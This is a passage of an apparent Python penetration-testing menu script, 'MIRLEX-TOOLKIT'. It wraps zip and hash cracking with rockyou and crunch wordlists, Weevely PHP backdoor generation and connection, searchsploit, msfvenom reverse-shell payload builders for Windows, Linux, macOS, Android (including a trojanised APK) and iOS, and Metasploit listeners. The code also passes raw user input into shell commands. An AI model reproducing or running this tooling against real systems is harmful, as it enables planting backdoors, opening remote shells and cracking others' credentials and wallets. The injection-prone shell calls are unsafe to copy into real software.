  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
  23200 | XMPP SCRAM PBKDF2-SHA1                                     | Instant Messaging Service
  28300 | Teamspeak 3 (channel hash)                                 | Instant Messaging Service
  22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)              | Instant Messaging Service
  24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)           | Instant Messaging Service
  22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
     23 | Skype                                                      | Instant Messaging Service
  29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))           | Cryptocurrency Wallet
  26600 | MetaMask Wallet                                            | Cryptocurrency Wallet
  21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet
  28501 | Bitcoin WIF private key (P2PKH), compressed                | Cryptocurrency Wallet
  28502 | Bitcoin WIF private key (P2PKH), uncompressed              | Cryptocurrency Wallet
  28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed       | Cryptocurrency Wallet
  28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed     | Cryptocurrency Wallet
  28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed         | Cryptocurrency Wallet
  28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed       | Cryptocurrency Wallet
  11300 | Bitcoin/Litecoin wallet.dat                                | Cryptocurrency Wallet
  16600 | Electrum Wallet (Salt-Type 1-3)                            | Cryptocurrency Wallet
  21700 | Electrum Wallet (Salt-Type 4)                              | Cryptocurrency Wallet
  21800 | Electrum Wallet (Salt-Type 5)                              | Cryptocurrency Wallet
  12700 | Blockchain, My Wallet                                      | Cryptocurrency Wallet
  15200 | Blockchain, My Wallet, V2                                  | Cryptocurrency Wallet
  18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
  25500 | Stargazer Stellar Wallet XLM                               | Cryptocurrency Wallet
  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
  15700 | Ethereum Wallet, SCRYPT                                    | Cryptocurrency Wallet
  22500 | MultiBit Classic .key (MD5)                                | Cryptocurrency Wallet
  27700 | MultiBit Classic .wallet (scrypt)                          | Cryptocurrency Wallet
  22700 | MultiBit HD (scrypt)                                       | Cryptocurrency Wallet
  28200 | Exodus Desktop Wallet (scrypt)                             | Cryptocurrency Wallet
			""")
		elif (hashno=="99"):
			figlet2()
			default()
			Main()
		elif(hashno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")
		
		
		
		
		
		
		
def zipkırıcı():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
		     ZIP Breaker
	------------------------------------------
	0-	Fcrackzip
	1-	With Hashcat|Winzip and 7zip
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
	
{Fore.RESET}
	""")
	while True:
		zipno=input("Please select the options: ")
		if (zipno=="0"):
			zipismi=input("Please enter the filename with extension: ")
			os.system("fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u "+zipismi)
		elif (zipno=="1"):
			zipismi=input("Please enter the filename with extension: ")
			dosyaadı, uzanti = os.path.splitext(zipismi)
			os.system("zip2john "+zipismi+" | cut -d ':' -f 2 > "+dosyaadı+".txt ")
			print(f"""
{Fore.YELLOW}
			-------------------------------------------
				 HASHCAT-JOHN THE RIPPER
			-------------------------------------------
			0-	Winzip
			1-	7zip
			
			99-	Main Menu
			000-	EXIT MIRLEX-TOOLKIT
			INFO-> 	Default wordlist is rockyou.txt
{Fore.RESET}
			""")
			ziptür=input("Please select the options: ")
			if (ziptür=="0"):
				soru=str(input("Do you want to use different word lists?|Y/N: ")).upper()
				if (soru=="N"):
					pww=os.popen("pwd").read()
					os.system("hashcat -m 13600 "+dosyaadı+".txt "+pww+"usr/share/wordlists/rockyou.txt")
				else:
					sifre=input("Please enter the path to your word list along with its name and extension: ")
					os.system("hashcat -m 13600 "+dosyaadı+".txt "+sifre)
			elif (ziptür=="1"):
				soru=str(input("Do you want to use different word lists?|Y/N: ")).upper()
				if (soru=="N"):
					pww=os.popen("pwd").read()
					os.system("hashcat -m 11600 "+dosyaadı+".txt "+pww+"usr/share/wordlists/rockyou.txt")
				else:
					sifre=input("Please enter the path to your word list along with its name and extension: ")
					os.system("hashcat -m 11600 "+dosyaadı+".txt "+sifre)
			elif (ziptür=="99"):
				figlet2()
				default()
				Main()
			elif (ziptür=="000"):
				print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
				exit()	
			else:
				print("Invalid option. Please try again.")
		elif (zipno=="99"):
			figlet2()
			default()
			Main()
		elif (zipno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()				
		else:
			print("Invalid option. Please try again.")
		
			
		
		
		


def crunch():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			Crunch
	------------------------------------------
	0-	Create wordlist		crunch <min> <max> -o wordlist.txt
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	
	""")
	while True:
		crno=input("Please select the options: ")
		if (crno=="0"):
			mina=input("Please enter the minimum value: ")
			maxa=input("Please enter the maximum value: ")
			addı=input("What should the name of the wordlist be?:  ")
			pdd=os.popen("pwd").read()
			os.system("crunch "+mina+" "+maxa+" -o "+pdd+"src/crunchlog/"+addı+".txt")
			print("!!!Your wordlist has been successfully created inside the crunch log folder!!!")
		elif (crno=="99"):
			figlet2()
			default()
			Main()
		elif (crno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()	
		else:
			print("Invalid option. Please try again.")
	
		
		



def exiftool():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			ExifTool
	------------------------------------------
	0-	Default		exiftool Path/test.jpeg
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	
	""")
	while True:
		exno=input("Please select the options: ")
		if (exno=="0"):
			exismi=input("Please write the location, file name and extension of your file as shown above: ")
			os.system("exiftool "+exismi)
		elif (exno=="99"):
			figlet2()
			default()
			Main()
		elif (exno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")


			

def weveely():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			Weevely
	------------------------------------------
	0-	Generate Backdoor			weevely generate 1234 backdoor.php
	1-	Gnerate Backdoor(Manually Password)	weevely generate "passw" backdoor.php
	2- 	Connecting Backdoor(Manually Password)	weevely http://10.0.2.15/hackable/uploads/backdoor.php "passwd"
	3-	COnnecting Backdoor			weevely http://10.0.2.15/hackable/uploads/backdoor.php  1234
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	
	""")
	while True:
		weno=input("Please select the options: ")
		if (weno=="0"):
			os.chdir("src/weevely")
			os.system("weevely generate 1234 backdoor1.php")
			os.chdir("../..")
		elif (weno=="1"):
			passwd = input("Please enter the password you want to give: ")
			os.chdir("src/weevely")
			os.system("weevely generate "+passwd+" backdoor2.php")
			os.chdir("../..")
		elif (weno=="2"):
			passd = input("Please enter the password you provided: ")
			url = input("Write the path where backdoor is loaded on the site: ")
			os.system("weevely "+url+" "+passd)
		elif (weno=="3"):
			url = input("Write the path where backdoor is loaded on the site: ")
			os.system("weevely "+url+" 1234")
		elif (weno=="99"):
			figlet2()
			default()
			Main()
		elif (weno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")
			



def sploit():
	os.system("clear")
	print(f"""   
{Fore.YELLOW}
                                              ###               #######  ##  ##   ######   ####      #####    ####    ######
                                               ##                ##   #  ##  ##    ##  ##   ##      ##   ##    ##     # ## #
  #####    ####     ####    ######    ####     ##                ## #     ####     ##  ##   ##      ##   ##    ##       ##
 ##       ##  ##       ##    ##  ##  ##  ##    #####             ####      ##      #####    ##      ##   ##    ##       ##
  #####   ######    #####    ##      ##        ##  ##            ## #     ####     ##       ##   #  ##   ##    ##       ##
      ##  ##       ##  ##    ##      ##  ##    ##  ##            ##   #  ##  ##    ##       ##  ##  ##   ##    ##       ##
 ######    #####    #####   ####      ####    ###  ##           #######  ##  ##   ####     #######   #####    ####     ####

		
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT

{Fore.RESET}
 
	""")
	while True:
		spno=input("Please enter the name of the exploit you want to search for: ")
		if (spno=="99"):
			figlet2()
			default()
			Main()
		elif (spno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			os.system("searchsploit "+spno)
		break
	spe=input("do you want to continue:Y/N ").upper()
	if (spe=="Y"):
		sploit()
	elif (spe=="N"):
		print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
		exit()
	else:
		sploit()
		print("Invalid option. Please try again.")
		
		
		
		
def venom():
	os.system("clear")
	print(f"""
{Fore.YELLOW}
 ___ ___  _______  _______  ___ ___  _______  ______   _______  ___ ___    __                  __        __
|   Y   ||   _   ||   _   ||   Y   ||   _   ||   _  \ |   _   ||   Y   |  |  |--..---.-..----.|  |--..--|  |.-----..-----..----.
|.      ||   1___||.  1___||.  |   ||.  1___||.  |   ||.  |   ||.      |  |  _  ||  _  ||  __||    < |  _  ||  _  ||  _  ||   _|
|. \_/  ||____   ||.  __)  |.  |   ||.  __)_ |.  |   ||.  |   ||. \_/  |  |_____||___._||____||__|__||_____||_____||_____||__|
|:  |   ||:  1   ||:  |    |:  1   ||:  1   ||:  |   ||:  1   ||:  |   |
|::.|:. ||::.. . ||::.|     \:.. ./ |::.. . ||::.|   ||::.. . ||::.|:. |
`--- ---'`-------'`---'      `---'  `-------'`--- ---'`-------'`--- ---'

	0-Windows Meterpreter Reverse TCP	  
	1-Windows Reverse TCP (shell)		  
	2-Linux Meterpreter Reverse TCP		   
	3-macOS Meterpreter Reverse TCP 	   
	4-macOS Reverse TCP (shell)		  
	5-PHP Meterpreter Reverse TCP		   
	6-PHP Reverse PHP			  
	7-Android Meterpreter Reverse TCP	   
	8-Andorid Meterpreter Embed Reverse TCP    
	9-Apple IOS Meterpreter Reverse TCP	   
	10-Python Reverse TCP			   
	11-Bash Reverse TCP			   
	12-JSP Reverse TCP 			   
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")

	while True:
		mno=input("Please select the options: ")
		if (mno=="0"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe -o reverse.exe")
			os.chdir("../..")
		elif (mno=="1"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p windows/x64/shell/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe -o reverse1.exe")
			os.chdir("../..")
		elif (mno=="2"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f elf -o reverse2.elf")
			os.chdir("../..")
		elif (mno=="3"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f macho -o shell.macho")
			os.chdir("../..")
		elif (mno=="4"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p osx/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f macho -o shell1.macho")
			os.chdir("../..")
		elif (mno=="5"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f raw -o shell2.php")
			os.chdir("../..")
		elif (mno=="6"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p php/reverse_php LHOST="+lhost+" LPORT="+lport+" -o shell.php")
			os.chdir("../..")
		elif (mno=="7"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" R -o malicious.apk")
			os.chdir("../..")
		elif (mno=="8"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -o payload1.apk")
			os.chdir("../..")
		elif (mno=="9"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f macho -o payload")
			os.chdir("../..")
		elif (mno=="10"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p cmd/unix/reverse_python LHOST="+lhost+" LPORT="+lport+" -f raw")
			os.chdir("../..")
		elif (mno=="11"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p cmd/unix/reverse_bash LHOST="+lhost+" LPORT="+lport+" -f raw -o shell3.sh")
			os.chdir("../..")
		elif (mno=="12"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			os.chdir("src/msfvenom")
			os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f raw -o shell4.jsp")
			os.chdir("../..")
		elif (mno=="99"):
			figlet2()
			default()
			Main()
		elif (mno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")
			
			
			
def listen():
	os.system("clear")	
	print(f"""
{Fore.YELLOW}
  ___ ___  _______  _______  _______  _______  ______   _______  _______  ___      _______    __  __         __
|   Y   ||   _   ||   _   ||   _   ||   _   ||   _  \ |   _   ||   _   ||   |    |   _   |  |  ||__|.-----.|  |_ .-----..-----..-----..----.
|.      ||   1___||.  1___||.  1___||.  |   ||.  |   ||   1___||.  |   ||.  |    |.  1___|  |  ||  ||__ --||   _||  -__||     ||  -__||   _|
|. \_/  ||____   ||.  __)  |.  |___ |.  |   ||.  |   ||____   ||.  |   ||.  |___ |.  __)_   |__||__||_____||____||_____||__|__||_____||__|
|:  |   ||:  1   ||:  |    |:  1   ||:  1   ||:  |   ||:  1   ||:  1   ||:  1   ||:  1   |
|::.|:. ||::.. . ||::.|    |::.. . ||::.. . ||::.|   ||::.. . ||::.. . ||::.. . ||::.. . |
`--- ---'`-------'`---'    `-------'`-------'`--- ---'`-------'`-------'`-------'`-------'
	
	0-Windows Meterpreter Reverse TCP	   [for listener]  
	1-Windows Reverse TCP (shell)		   [for listener]    
	2-Linux Meterpreter Reverse TCP		   [for listener]     
	3-macOS Meterpreter Reverse TCP 	   [for listener]    
	4-macOS Reverse TCP (shell)		   [for listener]   
	5-PHP Meterpreter Reverse TCP		   [for listener]    
	6-PHP Reverse PHP			   [for listener]    
	7-Android Meterpreter Reverse TCP	   [for listener]   
	8-Andorid Meterpreter Embed Reverse TCP    [for listener]  
	9-Apple IOS Meterpreter Reverse TCP	   [for listener]  
	10-Python Reverse TCP			   [for listener]  
	11-Bash Reverse TCP			   [for listener]  
	12-JSP Reverse TCP 			   [for listener]  
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT

{Fore.RESET}
	""")		
	while True:
		lno=input("Please enter the name of the exploit you want to search for: ")
		if (lno=="0"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="1"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="2"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="3"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="4"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload osx/x64/shell_reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="5"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload php/meterpreter_reverse_tcp; set lhost "'+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="6"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload php/reverse_php; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="7"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="8"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="9"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload apple_ios/aarch64/meterpreter_reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="10"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload cmd/unix/reverse_python; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="11"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload cmd/unix/reverse_bash; set lhost '+lport+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="12"):
			lhost = input("Enter the value you want to give to the LHOST: ")
			lport = input("Enter the value you want to give to the LPORT: ")
			x = '"use multi/handler; set payload java/jsp_shell_reverse_tcp; set lhost '+lhost+'; set lport '+lport+'; exploit"'
			a = "msfconsole -q -x "+x
			os.system(a)
		elif (lno=="99"):
			figlet2()
			default()
			Main()
		elif (lno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")
	




  




def Main():
	while True:
		sayno=input("Please select the tool you want to use: ")

		if (sayno=="0"):
			figlet2()
			ping_pro()
		elif (sayno=="1"):
			figlet2()
			nmap_pro()
		elif (sayno=="2"):
			figlet2()
			gobuster_pro()
		elif (sayno=="3"):
			figlet2()
			netdiscover()
		elif (sayno=="4"):
			figlet2()
			hydra_pro()
		elif (sayno=="5"):
			figlet2()
			binwalk()
		elif (sayno=="6"):
			figlet2()
			macchanger()
		elif (sayno=="7"):
			figlet2()
			zipkırıcı()
		elif (sayno=="8"):
			figlet2()
			hashcat()
		elif (sayno=="9"):
			figlet2()
			firewalltester()
		elif (sayno=="10"):
			figlet2()
			vpntester()
		elif (sayno=="11"):
			figlet2()
			openvpn()
		elif (sayno=="12"):
			figlet2()
			crunch()
		elif (sayno=="13"):
			figlet2()
			exiftool()
		elif (sayno=="14"):
			figlet2()
			weveely()
		elif (sayno=="15"):
			sploit()
		elif (sayno=="16"):
			venom()
		elif (sayno=="17"):
			listen()
			
		elif (sayno=="99"):
			os.system("clear")
			os.system("figlet SEE YOU :D | lolcat -t -a -s 200")
			exit()
		else:
			print("Invalid option. Please try again.")
Main()
